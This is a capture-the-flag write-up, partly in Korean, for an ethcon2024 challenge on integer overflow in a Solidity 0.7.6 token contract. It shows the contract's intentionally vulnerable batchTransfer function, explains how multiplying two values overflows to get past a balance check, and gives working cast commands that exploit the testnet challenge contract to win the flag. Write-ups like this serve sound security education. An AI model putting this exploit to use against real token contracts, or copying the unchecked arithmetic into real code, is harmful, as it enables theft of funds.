# Intermediate: 3. integer



**Mission**

Integer overflow is a critical vulnerability in smart contracts that occurs when an arithmetic operation results in a value that exceeds the maximum limit of the data type. This can lead to unexpected behavior and severe security risks - [contract](https://sepolia.scrollscan.com/address/0xEC6851a1286b9E969B0508a5270d073b06205831)

```solidity
pragma solidity ^0.7.6;

contract Integer {
    mapping(address => uint256) balances;
    mapping(address => bool) private minted;
    mapping(address => bool) public flag;

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    function mint() external {
        require(minted[msg.sender] == false, "Already minted");
        balances[msg.sender] += 100;
        minted[msg.sender] = true;
    }

    function transfer(address receiver_, uint256 value_) external {
        require(balances[msg.sender] >= value_, "Insufficient balance");
        balances[msg.sender] -= value_;
        balances[receiver_] += value_;
    }

    function batchTransfer(
        address[] calldata receivers_,
        uint256 value_
    ) external {
        uint256 cnt = receivers_.length;
        uint256 amount = cnt * value_;
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        for (uint i = 0; i < cnt; i++) {
            balances[receivers_[i]] += value_;
        }
    }

    function buyFlag() external payable {
        require(
            balances[msg.sender] >=
                10000000000000000000000000000000000000000000000000000000000 ether,
            "Insufficient balance"
        );
        balances[msg.sender] = 0;
        flag[msg.sender] = true;
    }
}
```

uint overflow로 문제를 해결할 수 있다.

Solidity 0.8.0 이상부터는 컴파일 단계에서 overflow나 underflow같은 버그들이 자동으로 잡히지만, 그 이하 버전에서는 문제가 발생한다. 그렇다면 어디서 overflow가 일어나는지 알아보자.

batchTransfer() 함수를 살펴보자.

```solidity
    function batchTransfer(
        address[] calldata receivers_,
        uint256 value_
    ) external {
        uint256 cnt = receivers_.length;
        uint256 amount = cnt * value_;
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        for (uint i = 0; i < cnt; i++) {
            balances[receivers_[i]] += value_;
        }
    }
```

require로 msg.sender가 amount 이상을 갖고 있는지 체크 후, amount만큼을 빼고, receiver들에게는 value_만큼 주는 것을 알 수 있다. 이때 value_에 cnt를 곱한 값이 amount가 된다. 우리는  value_*cnt에서 value_를 매우 큰 값으로 줘 amount가 uint256 최댓값을 넘기게 할 수 있다. 그렇게 된다면 오히려 amount가 작은 수가 되어 조건을 우회할 수 있게 되고(overflow로 인해 uint256 max + 1 = 0이므로) 그러면서 value_는 큰 값이므로, receiver중 하나를 내 지갑 주소로하면, buyFlag의 조건을 통과할 수 있게 된다. 

그렇다면 공격해보자. 아래는 uint256의 최댓값이다.

```solidity
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

우리는 receiver를 두명으로 설정해, cnt를 2로 만들 것이다. 그렇다면 (uint256 max)/2 + 1을 한 값을 value로 두자(+1을 해야 cnt * value_ 에서 overflow가 발생하므로).  

type(uint256).max/2 + 1:

```solidity
57896044618658097711785492504343953926634992332820282019728792003956564819968
```

해당 값을 value_로 하여 공격을 수행하자.

receiver중 하나는 본인 주소, 하나는 아무거나 선택하면 된다.

먼저 mint를 받아야 한다.

```solidity
cast send 0xEC6851a1286b9E969B0508a5270d073b06205831 "mint()" --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

Call batchTransfer for Exploit:

```solidity
cast send 0xEC6851a1286b9E969B0508a5270d073b06205831 "batchTransfer(address[],uint256)" "[0x4C5F15604c4B63EcBe4DFfA125879e0CC278711b, 0xEC6851a1286b9E969B0508a5270d073b06205831]" 57896044618658097711785492504343953926634992332820282019728792003956564819968 --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY 
```

buyFlag:

```solidity
cast send 0xEC6851a1286b9E969B0508a5270d073b06205831 "buyFlag()" --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

Flag:

```solidity
ethcon2024{https://MEDIUM.com/secbit-media/a-disastrous-vulnerability-found-in-smart-contracts-of-beautychain-bec-dbf24ddbc30e}
```